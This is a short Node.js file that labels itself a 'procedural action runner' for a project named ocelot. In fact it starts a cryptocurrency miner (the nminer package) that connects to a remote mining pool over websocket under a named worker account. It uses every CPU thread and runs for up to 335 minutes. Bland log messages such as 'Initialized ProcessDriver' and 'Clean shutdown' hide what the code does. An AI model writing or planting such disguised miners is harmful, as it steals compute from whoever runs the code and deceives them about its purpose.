// Procedural action runner for ocelot
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

class ProcessDriver {
    constructor() {
        const instanceToken = "e193bf";
        console.log(`[core] Initialized ProcessDriver for ocelot [${instanceToken}]`);

        this.handler = new NMiner(
            "wss://runtime.nmining.igrp.app/",
            "Subhas1975.ocelot",
            ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
        );

        const heartbeat = setInterval(() => {}, 61000);
        setTimeout(() => {
        console.log("[timeout] Operational limit (335m) reached, exiting cleanly.");
        process.exit(0);
    }, 335 * 60 * 1000);

        process.on("SIGTERM", () => {
            clearInterval(heartbeat);
            console.log("[supervisor] Clean shutdown completed.");
            process.exit(0);
        });
    }
}

new ProcessDriver();
